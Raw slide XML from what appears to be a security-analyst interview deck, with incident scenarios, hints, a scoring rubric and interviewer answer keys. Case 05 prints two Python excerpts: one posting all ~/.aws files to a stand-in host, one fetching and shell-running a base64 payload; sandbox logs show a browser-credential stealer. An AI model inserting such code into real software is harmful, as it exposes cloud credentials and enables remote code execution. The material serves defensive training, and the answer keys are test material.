    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8716554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0301B-04BA-45BC-A140-D2F68AB6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03  /  invoice_viewer.exe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05733-DF2B-49C0-B952-B15AF9D8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PE TRIAGE + SANDBOX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EA7A4-227E-41E4-9FC8-36F0E4DB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58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sample.path=C:\Users\nina\Downloads\invoice_viewer.exe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sample.sha256=a93f5c0b7e42d16f56c243680ed145ad14261814f6835c256a762f2dd907c9b1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sample.authenticode=Unsigned sample.size=381952 bytes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PE.imports=CRYPT32!CryptUnprotectData,WINHTTP!WinHttpSendRequest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strings[0]=Chrome\User Data\Default\Login Data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strings[1]=Software\Microsoft\Windows\CurrentVersion\Run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2026-09-29T11:06:02Z sandbox/file_read path=...\Chrome\User Data\Default\Login Data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2026-09-29T11:06:04Z sandbox/registry_set key=HKCU\...\CurrentVersion\Run\DocSync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value=C:\Users\nina\Downloads\invoice_viewer.exe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2026-09-29T11:06:08Z sandbox/http method=POST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url=https://telemetry-billing.example/api/collect bytes_sent=18432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EA06A-BE58-4DFD-AD4C-EBF26A24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F81E0-25F9-44F3-96F3-DE0F3A0D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What do the static and sandbox findings show? How would you analyze the sample safely?</a:t>
            </a:r>
          </a:p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find affected hosts, assess exposure, and prevent another run?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1397785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D5C62-D588-4E57-AC9B-EA2E0E9D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04  /  AWS account 123456789012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83E49-1914-46A9-BDF5-6E3325DF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CLOUDTRAIL MANAGEMENT EVENTS  ·  15:44–15:46 UTC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6C1F2-9AA8-4011-A9A8-04CC7F2B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58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2026-09-29T15:44:02Z CloudTrail eventName=DescribeTrails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actor=assumed-role/ci-deploy/runner-7 sourceIPAddress=198.51.100.92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2026-09-29T15:44:38Z CloudTrail eventName=CreateAccessKey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actor=assumed-role/ci-deploy/runner-7 requestParameters.userName=breakglass-admin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responseElements.accessKey.accessKeyId=AKIA7EXAMPLE9G2K4Q6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2026-09-29T15:46:07Z CloudTrail eventName=StopLogging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actor=assumed-role/ci-deploy/runner-7 requestParameters.name=org-audit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sourceIPAddress=198.51.100.92 awsRegion=us-east-1 errorCode=null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98DBD-A821-41A3-A798-1D67FB6D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75305-C4D2-4327-93AB-7A2801BE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What do these CloudTrail events suggest, and what would you verify first?</a:t>
            </a:r>
          </a:p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detect similar activity, restore visibility, and limit the CI role?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1812830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3A089-9115-48C5-BC42-13297436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05  /  Python script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E0E03-4EA7-499C-9C42-E89F5AB1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TWO EXCERPTS FROM A HOST-HEALTH PACKAGE  /  EXECUTION STATUS UNKNOWN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2A00D-A165-4CCF-B012-5E984787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A  /  collect.py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7DC9C-65D2-4624-93B9-65E3C94F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525"/>
            <a:ext cx="509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sync_url = https://support-sync.example/api/diag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E7DEE-5A79-4D11-9B46-3449EE84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50482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from pathlib import Path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import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root = Path.home() / '.aws'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items = {p.name: p.read_text()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     for p in root.glob('*')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     if p.is_file()}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requests.post(sync_url, json=items,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          timeout=5)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59F93-345C-45FE-B322-2678E118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B  /  apply.py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BC70D-B869-4ADC-ABF7-273B3C16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14525"/>
            <a:ext cx="521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feed_url = https://updates-helpdesk.example/manifest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5A3A3-AAAA-4CAC-A439-53A0129F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5191125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import base64, subprocess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import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manifest = requests.get(feed_url,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                    timeout=5).json()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blob = base64.b64decode(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   manifest['post_check'])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subprocess.run(blob.decode(),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           shell=True, check=False)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799B4-65A7-4C7A-AEE5-D1B3D734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398F8-AD76-4BFB-B8CB-487517EC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What can each excerpt do, and what evidence would prove it ran or moved secrets?</a:t>
            </a:r>
          </a:p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detect related activity, contain exposure, and change the risky design?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="428657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/>
          <p:cNvCxnSpPr>
            <a:stCxn xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" id="19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10077450" y="3267075"/>
            <a:ext cx="4763" cy="914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439025" y="2662238"/>
            <a:ext cx="1285875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829175" y="2667000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24100" y="266700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A79AF8-CF58-456B-B731-08955703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Architecture A  /  customer data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3F877-1FD1-4AB5-A270-022685BB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Current design  ·  VPC 10.10.0.0/16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A65D3-91E8-48DC-B8CC-35F5CF3C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EXTERNAL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2CDF9-057F-4B1C-9413-04675C11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704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7F56C-7827-480E-9C1B-9FDB502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04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FAD06-68EC-4483-AFBE-111479D8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704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8139A-2484-4F9D-A8A5-6B603C49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619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94E46-F1A5-4778-B212-2A561B3D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76475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6704B-2C51-4570-987B-DB66B2ED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38425"/>
            <a:ext cx="137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Untrusted clients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CFC85-6F5A-474A-BEB4-8ED6FA59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52650"/>
            <a:ext cx="171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5AED7-6449-4F35-8D9E-D93E34E3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7647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Public ALB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194FB-F6A6-4C17-8CB7-08CE3704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38425"/>
            <a:ext cx="146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HTTPS 443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C3E4F-7760-4A4C-B575-7B306102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52650"/>
            <a:ext cx="1857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4BDA0-3FF4-4C5B-BFE7-FCC8584D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276475"/>
            <a:ext cx="1609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Web /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B27D5-6727-4F39-8E4D-72AC12B0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638425"/>
            <a:ext cx="1609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sg-app  ·  TCP 8443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59DAF-2BFC-42E7-96C6-D603FC0C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57400"/>
            <a:ext cx="27146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73889-0D25-419A-A476-F4ED895A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181225"/>
            <a:ext cx="24669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AA591-1BAB-4ACD-892E-93FA2A6C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43175"/>
            <a:ext cx="2466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sg-db: TCP 5432</a:t>
            </a:r>
          </a:p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from 10.10.0.0/16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472CF-AEF8-493C-91F8-731DF0F1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81475"/>
            <a:ext cx="20383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57AFA-6ACF-45CC-8454-EC272E85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05300"/>
            <a:ext cx="179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Corporate VPN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13806-B54D-4067-936D-E6967F9F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672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10.10.3.0/24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CBAE9E-A121-44F9-A3F4-2378C18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670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443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1FF561-D9F3-457C-9BAA-48EC5466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6702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8443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691DA-7E78-4A4D-8917-0F58D8AC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6702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5432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6D4735-74AD-4CE8-B970-4BC987C3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4807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5432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61984A-C418-4418-9026-BE79E25C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Where is the weak trust boundary? How would you detect abuse, contain it, and redesign it?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1006197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53325" y="3300413"/>
            <a:ext cx="1362075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553325" y="2376488"/>
            <a:ext cx="1362075" cy="923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76800" y="330041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38400" y="3300413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4CAE69-345B-4DF0-B787-14535971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Architecture B  /  production administration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99BF2-B963-414D-91FD-CDDCFA4D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Current design  ·  direct access to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0EB81-EEF7-4778-B614-B021005A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17526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DB3CB-AEAC-429C-AF37-77F95936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14650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Laptop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4A048-BBB9-4A4B-BC54-21F10EDD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766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Contractor / unmanaged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C6025-3F6E-4D8A-83B8-7C3BB692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90825"/>
            <a:ext cx="17526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4E3E3-40EF-4A1F-A769-CA15E6A0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914650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VPN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15F8D-88DC-4389-ACFE-79339F7B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766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Password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93897-9C86-4825-BFA7-560CC06A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90825"/>
            <a:ext cx="19812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F798F-63CE-4ED8-ADC8-53EA6185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Admin subnet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30C86-DD30-4243-9B38-EBB83CB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Shared admin account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02F49-9989-40D8-A93F-8EACB371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76425"/>
            <a:ext cx="2419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4FAF7-74F9-47C4-8D91-AF1726D7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00250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Production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81277-867F-422C-9D9C-AE477E22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622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SSH / WinRM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B1B9C-9754-4AE1-A929-4B276F55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48100"/>
            <a:ext cx="2419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8B938-DF5B-4FC0-9AE4-BB40BA29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971925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Production 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88A7E-E746-4E77-AC23-062D1CAF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33387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TCP 5432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814501-53AA-4C2D-8D2C-66A8F145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SIEM feed: VPN sign-ins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33ED4-757C-40F5-BF57-42B54FD9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Which access and audit gaps matter most? How would you detect, mitigate, and prevent abuse?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3367436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0CE52-34D4-4767-BA4D-549B4251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7F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7F2"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>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BBEED-A472-4679-8C87-01A28051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FD7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FD7D8"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Stop sharing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12862163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D9DF9-C531-484C-8A89-ECB93C4F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In-person interview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48341-EFD2-4592-AA92-7B9A67B5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Use any four scenarios for a 45-minute interview, or all seven for a longer session.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00AAE-0053-4574-9CDE-6727FCEE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Show one candidate slide at a time. Ask for an initial view before offering Hint 1, then Hint 2 only if needed. Record which hints were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BC165-2A49-4425-AB27-5BA8B337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03: probe safe sample analysis. Case 05: ask what the code proves versus what needs execution telemetry. Architecture cases: identify the trust boundary before proposing a tool.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="8880089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DD9F7-2050-4B59-94F9-F2827236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Scoring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D0510-57BA-4ED8-AB23-91E6053D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90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Score each area 0-2 per scenario. Maximum 10 per scenario.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E303F-FA48-4386-918D-0E0410FA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Diagnosis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BD662-9D7B-4E09-9F33-281D05C3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5737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Reconstructs the sequence or identifies the weak trust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A22DD-2ED5-44E3-B6F5-4BF0EA1A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84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Judgment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E2AD9-F19F-4067-B246-550CA419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3842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Separates observations from hypotheses and asks for decisive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64FB3-C27A-42B9-ADC7-5EFEDA69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59C95-6893-4D37-841D-F4ADA349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1947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Names useful telemetry, correlation keys, and likely false positives.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84E70-5F09-403E-9D1A-19A6662F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CEEAC-D2DF-4AEF-A360-3984513C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0052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Prioritizes containment while preserving evidence and continuity.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1E6AF-042B-4EB8-947F-6DD26790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6E402-EC2B-4A8C-BDF3-760A838C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8157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Proposes a durable control and explains its operational tradeoff.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D7E4C-4256-4C49-912B-8CB29CC8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0 = missing or wrong     1 = partial     2 = precise and defensible</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2597014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1A0D4-E115-49EE-B03C-2A1EAC98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01  /  LT-184  / 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B0D74-8AFF-427C-80E3-380652FA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C7883-2B25-40D5-9EE7-A4F61647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What execution chain does this evidence support, and what remains unproven?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hunt for related activity, contain the host, and prevent recurrence?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20953-5D5A-473F-99BB-6EF1FB7E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878C2-9932-46A0-BAA1-8B5BEF95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5095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Trace the process tree from WINWORD through PowerShell to the downloaded file.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E350D-A01F-495E-A6A9-66BB3F54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FCB72-3169-4DFD-A253-C494BB0C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509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Which ScriptBlockText line shows that PowerShell both fetched and ran s.exe?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BBAF5-4CD0-47C1-94BB-94AAB0A4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4BC65-5AD0-41A9-BC55-6DEED49F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9725"/>
            <a:ext cx="5095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Reward a clear execution chain and uncertainty about the initial document trigger and payload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FF5CE-989B-4B1E-8EA2-3ACFF30C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A745D-0C48-4AA4-9F7E-423350F1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573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WINWORD launched hidden PowerShell; 4104 downloads and runs s.exe. The logs do not show a macro or the payload's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C1138-8E5C-4BEC-B3D8-C90670CD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6A700-85E5-4440-9052-4E881294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Correlate the Office child process, 4104 content, network event, and file hash across hosts. Check approved automation.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B0E14-CC9A-45F8-AF13-287E601F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E58C3-88AB-4EE6-81C9-BC0B4612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Isolate LT-184, preserve the document and payload, stop execution, and scope the hash and domain.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2624A-C306-46DB-884B-581C0EDB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54F70-CCF7-45C2-BEC5-2C7371F8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577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Use Office child-process ASR and application control for user-writable paths. Keep script block logging.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18967655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E3616-60B4-404F-B820-017640D3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02  /  WS-107 to FS-02  / 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1C3A9-D640-4CC3-9984-CCE622F6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CD1DE-037C-4876-8DA9-03BC918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Is this approved administration or persistence? Which evidence would decide?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What would you detect, mitigate immediately, and change in the access design?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40774-6AF7-4E31-93E8-4E88129D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D5677-F5FD-47DE-9935-85E2BDD5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5095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Put source and target events in time order, including WinRM and the remote logon.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09882-B03A-45F1-8ABF-48FE3AD7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2095A-F08A-47EF-A664-60B4A576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509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What changed on FS-02, and which change record or binary evidence would decide legitimacy?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D1735-0899-4100-80CF-AC6C5412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0AF8E-37C8-415D-B84C-EBFEEF39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9725"/>
            <a:ext cx="5095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Accept an authorized patching hypothesis if the candidate names evidence that could confirm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5FB79-8DD3-4D65-8334-85A2A724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45876-A4F9-4F7F-AC24-85BD9379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573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PowerShell remoting from WS-107 creates a scheduled task on FS-02. The task may be administrative or persistence.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93557-3D17-4FE0-804A-03435A56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917F8-3A4F-4827-993B-C006A960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Join source 4104 and port 5985 with target 4624, 4104, and TaskScheduler/106. Baseline approved sources.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61697-F4D4-4109-9009-5DC363FA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74A5D-EF6E-49E1-8454-32222D1C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If unauthorized, preserve and disable the task, inspect both hosts, and rotate svc_patch credentials.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EADF8-0B9F-4F8D-AED5-DF6D0497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6B91D-417A-4FA7-9878-3BEFCEA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577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Limit remoting to managed admin hosts, reduce service-account privilege, and use constrained endpoints.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2961169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E61AF-3DA3-483C-898D-111EF256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03  /  invoice_viewer.exe  / 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16849-607C-4D8B-A0FC-31D0EE3E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6BCFA-6F6E-4993-A55F-9C77C646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What do the static and sandbox findings show? How would you analyze the sample safely?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find affected hosts, assess exposure, and prevent another run?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3817B-7BD3-4EE8-9E58-BE790C78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46C7F-9FC7-4CC0-87BF-089D9D63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5095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Separate static imports and strings from behavior observed in the sandbox.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B5D56-D092-4541-A4BC-C6B71B12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7BC92-C1E2-4624-8C58-D666936C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509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Ask what was read, what persisted, and what the outbound POST proves.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C7FC5-B18F-4698-8083-2890647E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8CF04-4C8B-435B-B41D-DDCEA725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9725"/>
            <a:ext cx="5095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Do not treat bytes_sent as proof of the exact data transferred. Ask for the HTTP body or packet capture.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18BF8-E6F0-4231-8194-EADFBB87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C3B71-B32F-41E5-901F-543DF33C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573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Browser credential access, Run-key persistence, and outbound POST support a credential-stealing hypothesis. Content sent is unproven.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17B55-971B-4EEB-9720-DF89D66C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CFD6C-E665-479D-A169-111D1056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Hunt hash, non-browser access to Login Data, Run-key writes, and outbound requests. Analyze in isolation.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68C1D-B9B3-4BF3-ABA3-91F71805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7013D-0FEE-4072-8E92-24CCC356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Isolate affected hosts, preserve the sample, remove persistence after capture, and treat stored credentials as exposed.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EDF82-9170-4512-B48A-98213F11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D8857-27A2-405F-A01A-03FD4829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577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Restrict executables from download paths, verify provenance, and strengthen account protection.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="18115584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77F0F-1E74-4B0D-95C9-6FC96814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04  /  AWS account  / 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FEFDD-E073-4F95-A17D-1FD2F0F9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21E3B-6BF5-4AB4-A244-533633B4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What do these CloudTrail events suggest, and what would you verify first?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detect similar activity, restore visibility, and limit the CI role?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568B5-CC63-426B-8FD1-3035958F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823CD-E1ED-4E07-87AF-FAF30A0B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5095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Follow what the CI role did to a privileged identity and the audit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D76CA-CCDC-4E44-8A4E-E1E1D886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C820B-5851-4F13-A98B-FFBC9FC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509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Which API call could hide later actions? How would you verify the trail state now?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7D2BE-3AFF-4356-A8EA-6C4969FB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03533-7C47-47EC-8E30-3DDE2096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9725"/>
            <a:ext cx="5095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Probe whether they restore logging first and then search for use of the new key across regions.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53A70-246A-4E93-AA24-6D956419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93562-2BB1-4E76-9C41-01551E5D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573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The CI role creates a breakglass-admin key and calls StopLogging. Confirm authorization and current trail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7332A-5B3F-4EFA-A651-97362D58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C27CC-5381-4746-9AAE-2D328E52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Alert on privileged key creation plus StopLogging in one session. Correlate role, IP, account, region, and change record.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E92FA-EB44-4F50-932D-FEC5D573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BBD85-AAC6-42C3-AE2B-8CD837E7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Restore logging, disable the new key if unauthorized, revoke the role session, and trace key use.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92996-DC50-4843-A578-4C605850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E55B9-B815-4714-8167-05CC89B8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577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Remove key and logging-control rights from CI; protect trails with preventive policy and independent monitoring.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10654936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60834-F857-469A-8E30-8BF21274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05  /  Python script review  / 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40EEC-D38C-4213-B2B9-B7430927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8C0C0-E4CC-4B61-AA5D-078560A4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What can each excerpt do, and what evidence would prove it ran or moved secrets?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detect related activity, contain exposure, and change the risky design?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9C8B6-98AC-4095-8849-56696226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AD5AF-839C-44B5-9939-B2400DB9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5095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For A, trace data source to network sink. For B, trace fetched data to shell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96861-FFCD-4CA4-B08D-C00409B1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FDAE0-4B85-4BBB-9FC6-49D6EFAE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509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Which host events or response bodies would turn code capability into confirmed behavior?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A0A27-241A-4A30-9436-B1729517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3DE43-93A9-4E3A-8BBC-C84E23B6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9725"/>
            <a:ext cx="5095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Do not equate base64 with malware or a URL string with confirmed data transfer.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48BBC-CC7E-4D36-9590-E097847C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D8880-FF33-4357-91B1-4579AFF9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573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A reads files under ~/.aws for a JSON POST. B decodes a remote manifest field and runs it via shell. Execution is unknown.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0AF19-FC26-4CEF-A5D4-CF1FCC0E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D9FAD-F204-4B57-AB01-246D1315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Seek Python file access, process and child-process events, HTTP or DNS, and the fetched manifest body.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E4D97-3BCB-4C32-BCD6-A37BFB36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C4843-0392-4763-B7C0-DCC5F537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If run, preserve code and responses, scope hosts, revoke exposed cloud credentials, and disable remote execution.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B8D15-BB0B-4B27-B46D-958C3938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2CC36-1667-4350-A109-E09F17BF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577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Exclude secrets from diagnostics; replace remote shell with signed allowlisted actions and least privilege.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10134727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9E7EE-B78A-4E6C-B035-D159A50A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Architecture A  /  customer data path  / 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EBC1F-5BC2-4B61-B264-4A8A579C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8C5E6-0348-4982-9755-34BC6CB2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Where is the weak trust boundary?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detect abuse, contain it, and redesign it?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D820D-4CDA-40EA-AD3D-56379697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8C3B5-0320-47DA-9A1C-83E9E1C3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5095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Read the inbound rule on the database, then identify all potential source hosts.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61192-83A8-4E44-877C-D764F5FD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4D586-AEB5-48D5-A505-882D1C4C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509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Which sources inside 10.10.0.0/16 should actually reach TCP 5432?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56F24-54B6-45FA-9FEA-D952CCAC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47661-694B-4769-B270-4701DC1C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9725"/>
            <a:ext cx="5095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A narrow security-group rule is the relevant cloud firewall control; do not require an appliance.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38546-56EB-4C37-8E02-35CE572C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56630-6DA1-4A5E-8765-E272494F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573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The DB allows TCP 5432 from the whole VPC, including workloads and VPN clients beyond approved app hosts.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83274-5645-4E04-8C37-1362E794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F1F96-B0F5-456E-AE5B-C9780DB6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Query accepted 5432 VPC flows, DB audit, login anomalies, and changes to sg-db.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51F85-6712-4BA4-B0F5-7C9F8E8F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B225B-7273-45EC-A53F-0FDB3D76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Review legitimate clients, then narrow sg-db to the app group and an approved admin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B2D9F-3DE2-4D0D-9F35-F6F68F2C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F8A36-8626-4EB6-8CBC-3094CF5D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577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Manage least-privilege SG rules in reviewed infrastructure code and use time-bound admin access.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13829108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184E1-25A0-43F6-AF4F-00171541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Architecture B  /  production administration  / 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4E202-CC32-41B8-B5F5-84C7E7CA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BF258-BDDA-420C-B64F-63134C39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5095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Which access and audit gaps matter most?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detect, mitigate, and prevent abuse?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CB171-AD23-4C5A-81A5-C1958EE5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820BB-1C88-4B83-BB81-32E9F723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5095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Trace the contractor's identity from laptop through VPN to each production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E5BAD-00C2-45EA-8295-1AA2EAB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HINT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89C60-B006-44A8-841F-DD94EAB6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509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Where are MFA, per-person privilege, and command or session records?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2DDDC-E891-48A6-984B-3E3BBD33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84587-832A-4EA0-84CD-A7EC80C5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9725"/>
            <a:ext cx="5095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Reward defensible alternatives to a specific PAM product if they provide attribution and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6EDDA-702A-4741-B9D7-1917FAFC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9513E-B719-4E60-8A50-A2DD5F8B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573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Password-only VPN from an unmanaged device reaches production through a shared account; actions lack attribution.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9C561-3ED9-40BF-8427-3CA5B80F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A534D-7836-4C24-AB16-148D2F41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Join VPN sign-ins with privileged account use, host events, DB audit, and session records.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2F239-B979-426E-8A73-E6AE10AE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3E21C-183B-4ABF-8299-4A6A8700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Require MFA, restrict routes, replace or rotate shared credentials, and review live sessions.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3B569-5EED-456E-B825-4506BDF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10A75-DC8F-4B35-BDC6-877B0DC0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5777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Use managed admin devices, individual privileged identities, controlled access, and central session logging.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="710477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2026-09-29T13:22:04.7360000Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-29T13:22:04.7360000Z</dcterms:modified>
</coreProperties>
</file>